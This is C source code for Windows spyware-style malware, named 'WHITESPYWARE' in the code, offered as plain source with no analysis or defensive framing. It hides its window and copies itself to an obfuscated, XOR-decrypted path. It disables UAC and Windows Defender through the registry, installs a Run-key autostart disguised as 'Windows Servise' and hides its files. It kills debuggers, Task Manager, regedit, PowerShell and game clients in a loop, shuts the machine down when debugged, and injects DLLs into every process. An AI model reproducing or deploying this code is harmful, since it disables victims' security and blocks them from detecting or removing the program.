#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <excpt.h>
#include <tchar.h>
#include <wchar.h>
#include <tlhelp32.h>

#define ERROR_SIGN 0xFFFFFFFF
#define SUCCESS_SIGN 0x00000000
#define MAX_LENGTH 255

WCHAR targetProcess[17][128];

void checkDebugger();
void processManager();

BOOL injectAllProcess(LPCTSTR szDllPath);
BOOL injectDll(DWORD dwPID, LPCTSTR szDllPath);


DWORD main(int argc, char* argv[]) {
	//Hide
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_HIDE);

	HKEY RegKey = NULL;
	LONG result = 0;

	//Running
	result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\WHITESPYWARE"), 0, KEY_ALL_ACCESS, &RegKey);
	if (result == ERROR_SUCCESS) {
		CloseHandle(RegKey);
		return ERROR_SIGN;
	}

	HANDLE Thread[2];
	Thread[0] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)checkDebugger, NULL, 0, NULL);

	//First Run
	DWORD dwDisp = 0;
	result = RegCreateKeyEx(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\WHITESPYWARE"), 0, NULL, REG_OPTION_VOLATILE, KEY_ALL_ACCESS, NULL, &RegKey, &dwDisp);
	if (result != ERROR_SUCCESS) {
		return ERROR_SIGN;
	}
	CloseHandle(RegKey);
	result = 0;

	TCHAR info[MAX_LENGTH] = L"";
	unsigned char spyTemp[MAX_LENGTH] = { 0x42, 0xC5, 0xD1, 0xD8, 0xEE, 0xEF, 0xE9, 0xE0, 0xF5, 0xF1, 0xD5, 0xD8, 0xF5, 0xFF, 0xE3, 0xF0, 0xB5, 0xEB, 0xD8, 0xBA, 0xF6, 0xF5, 0xEC, 0xE5, 0xE9, 0xF5, 0x82, 0xF0, 0xE3, 0xAE, 0xE3, 0xFC, 0x00 };
	TCHAR spyFile[MAX_LENGTH] = L"";

	MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, argv[0], strlen(argv[0]), info, MAX_LENGTH);

	//SpyFile Path Decrypt Algorithm
	unsigned char tmp;
	char key = 0x3a;
	char key2 = 0xbd;
	int length = strlen(spyTemp);

	for (int i = 0; i < length; i += 2) {
		tmp = spyTemp[i + 1];
		spyTemp[i + 1] = spyTemp[i];
		spyTemp[i] = tmp;
	}

	for (int i = 0; i < length; i++) {
		spyTemp[i] = spyTemp[i] ^ key2;
	}

	for (int i = 0; i < length; i++) {
		spyTemp[i] = spyTemp[i] + 1;
	}

	for (int i = 0; i < length; i++) {
		spyTemp[i] = spyTemp[i] ^ key;
	}

	//Multiplication
	MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, spyTemp, strlen(spyTemp), spyFile, MAX_LENGTH);
	CopyFile(info, spyFile, FALSE);

	result = 0;

	//Auto Run
	HKEY UACkey = NULL;
	DWORD UACvalue = 0;
	result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), 0, KEY_ALL_ACCESS, &UACkey);
	if (result != ERROR_SUCCESS) {
		CloseHandle(UACkey);
		return ERROR_SIGN;
	}
	
	else {
		result = 0;
		result = RegSetValueEx(UACkey, TEXT("EnableLUA"), 0, REG_DWORD, (const BYTE*)&UACvalue, sizeof(UACvalue));
		if (result != ERROR_SUCCESS) {
			return ERROR_SIGN;
		}

	}
	CloseHandle(UACkey);

	//Disable Windows Defender   --->   Register The Spyware Exception

	HKEY WD = NULL;
	DWORD WDvalue = 1;
	result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\Policies\\Microsoft\\Windows Defender"), 0, KEY_ALL_ACCESS, &WD);
	if (result != ERROR_SUCCESS) {
		CloseHandle(WDvalue);
		return ERROR_SIGN;
	}

	else {
		result = 0;
		result = RegSetValueEx(WD, TEXT("DisableAntiSpyware"), 0, REG_DWORD, (const BYTE*)&WDvalue, sizeof(WDvalue));
		if (result != ERROR_SUCCESS) {
			return ERROR_SIGN;
		}

	}
	CloseHandle(WD);

	HKEY autokey = NULL;
	result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_ALL_ACCESS, &autokey);
	if (result != ERROR_SUCCESS) {
		CloseHandle(autokey);
		return ERROR_SIGN;
	}

	else {
		result = 0;
		result = RegSetValueExA(autokey, "Windows Servise", 0, REG_SZ, (BYTE*)spyTemp, strlen(spyTemp));
		if (result != ERROR_SUCCESS) {
			return ERROR_SIGN;
		}
	}

	CloseHandle(autokey);

	//Hide File
	TCHAR CMD[MAX_LENGTH] = L"attrib +s +h ";
	TCHAR CMD2[MAX_LENGTH] = L"attrib +s +h ";

	lstrcatW(CMD, info);
	lstrcatW(CMD2, spyFile);

	SetFileAttributes(info, FILE_ATTRIBUTE_HIDDEN);
	SetFileAttributes(spyFile, FILE_ATTRIBUTE_HIDDEN);

	ShellExecuteW(NULL, _T("open"), _T("cmd"), CMD, _T("C:\\"), SW_HIDE);
	ShellExecuteW(NULL, _T("open"), _T("cmd"), CMD2, _T("C:\\"), SW_HIDE);

	//Process Stealth
	








	//Set The Target Process'
	wcscpy(targetProcess[0], L"OLLYDBG.EXE");
	wcscpy(targetProcess[1], L"Taskmgr.exe");
	wcscpy(targetProcess[2], L"x32dbg.exe");
	wcscpy(targetProcess[3], L"x64dbg.exe");
	wcscpy(targetProcess[4], L"iexplore.exe");
	wcscpy(targetProcess[5], L"procexp64.exe");
	wcscpy(targetProcess[6], L"procexp.exe");
	wcscpy(targetProcess[7], L"League of Legends.exe");
	wcscpy(targetProcess[8], L"LeagueClient.exe");
	wcscpy(targetProcess[9], L"LeagueClientUx.exe");
	wcscpy(targetProcess[10], L"regedit.exe");
	wcscpy(targetProcess[11], L"powershell.exe");
	wcscpy(targetProcess[12], L"RiotClientServices.exe");
	wcscpy(targetProcess[13], L"RiotClientUx.exe");
	wcscpy(targetProcess[14], L"suddenattack.exe");
	wcscpy(targetProcess[15], L"tasklist.exe");
	wcscpy(targetProcess[16], L"taskkill.exe");

	//Create ProcessManager Thread
	Thread[1] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)processManager, NULL, 0, NULL);
	WaitForMultipleObjects(2, Thread, TRUE, INFINITE);

	return ERROR_SIGN;
}

void processManager() {
	while (1) {
		HANDLE hProcess = NULL;
		PROCESSENTRY32 pe32 = { 0 };
		hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		pe32.dwSize = sizeof(PROCESSENTRY32);
		BOOL ISCHECKED = FALSE;
		int i = 0;

		if (Process32First(hProcess, &pe32)) {
			do {
				//Checking
				for (i = 0; i < 17; i++) {
					if (!wcscmp(pe32.szExeFile, targetProcess[i])) {
						if (ISCHECKED == FALSE) {
							ISCHECKED = TRUE;
						}
					}
				}

				if (ISCHECKED) {
					HANDLE hProcess_ = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);

					if (hProcess_ != NULL) {
						TerminateProcess(hProcess_, 0);
						CloseHandle(hProcess_);
					}
					ISCHECKED = FALSE;
				}
			} while (Process32Next(hProcess, &pe32));
		}
		CloseHandle(hProcess);
		Sleep(500);
	}
}

void checkDebugger() {
	while (1) {
		Sleep(1000);
		if (IsDebuggerPresent()) {
			ShellExecute(NULL, L"open", L"cmd", L"/c shutdown -s -f -t 0", L"C:\\", SW_HIDE);
		}
	}
}











BOOL injectAllProcess(LPCTSTR szDllPath) {
	DWORD dwPID = 0;
	HANDLE hSnapShot = INVALID_HANDLE_VALUE;
	PROCESSENTRY32 pe;

	pe.dwSize = sizeof(PROCESSENTRY32);
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);

	Process32First(hSnapShot, &pe);
	do {
		dwPID = pe.th32ProcessID;
		if (dwPID < 100)
			continue;
		else
			injectDll(dwPID, szDllPath);
	} while (Process32Next(hSnapShot, &pe));

	CloseHandle(hSnapShot);

	return TRUE;
}

BOOL injectDll(DWORD dwPID, LPCTSTR szDllPath) {
	HANDLE hProcess, hThread;
	LPVOID pRemoteBuf;
	DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR);
	LPTHREAD_START_ROUTINE pThreadProc;

	if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID))) {
		return FALSE;
	}

	pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE);

	WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL);

	pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");

	hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);

	WaitForSingleObject(hThread, 1000);

	VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);

	CloseHandle(hThread);
	CloseHandle(hProcess);

	return TRUE;
}